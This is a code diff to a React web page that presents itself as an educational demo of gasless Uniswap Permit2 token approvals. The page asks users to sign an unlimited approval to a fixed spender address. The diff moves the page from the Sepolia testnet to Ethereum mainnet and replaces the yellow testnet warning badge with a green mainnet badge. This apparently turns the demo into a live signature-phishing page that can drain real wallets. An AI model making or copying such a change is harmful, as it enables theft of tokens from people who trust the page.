@@ -1,7 +1,7 @@
 import React, { useState, useEffect } from 'react';
 import { createAppKit } from '@reown/appkit/react';
 import { EthersAdapter } from '@reown/appkit-adapter-ethers';
-import { sepolia } from '@reown/appkit/networks';
+import { mainnet } from '@reown/appkit/networks';
 import { BrowserProvider, Contract, MaxUint256 } from 'ethers';
 
 // ============================================================================
@@ -34,7 +34,7 @@ const metadata = {
 // Initialize AppKit
 const appKit = createAppKit({
   adapters: [new EthersAdapter()],
-  networks: [sepolia],
+  networks: [mainnet],
   metadata,
   projectId: WALLETCONNECT_PROJECT_ID,
   features: {
@@ -223,8 +223,8 @@ You are about to sign a gas-free message that cryptographically authorizes the U
           <p className="text-gray-300 text-sm">
             Educational demonstration of gasless token approvals (Uniswap Permit2)
           </p>
-          <div className="mt-2 px-3 py-1 bg-yellow-500/20 border border-yellow-500/40 rounded-lg inline-block">
-            <span className="text-yellow-200 text-xs font-semibold">⚠️ SEPOLIA TESTNET</span>
+          <div className="mt-2 px-3 py-1 bg-green-500/20 border border-green-500/40 rounded-lg inline-block">
+            <span className="text-green-200 text-xs font-semibold">🌐 ETHEREUM MAINNET</span>
           </div>
         </div>
 
@@ -298,7 +298,7 @@ You are about to sign a gas-free message that cryptographically authorizes the U
             <div className="mt-3 space-y-2 font-mono bg-black/20 p-3 rounded-lg">
               <div><strong>Token:</strong> {TOKEN_CONTRACT_ADDRESS.slice(0, 10)}...</div>
               <div><strong>Spender:</strong> {SPENDER_ADDRESS.slice(0, 10)}...</div>
-              <div><strong>Network:</strong> Sepolia Testnet</div>
+              <div><strong>Network:</strong> Ethereum Mainnet</div>
               <div><strong>Approval:</strong> Unlimited (MaxUint256)</div>
             </div>
           </details>
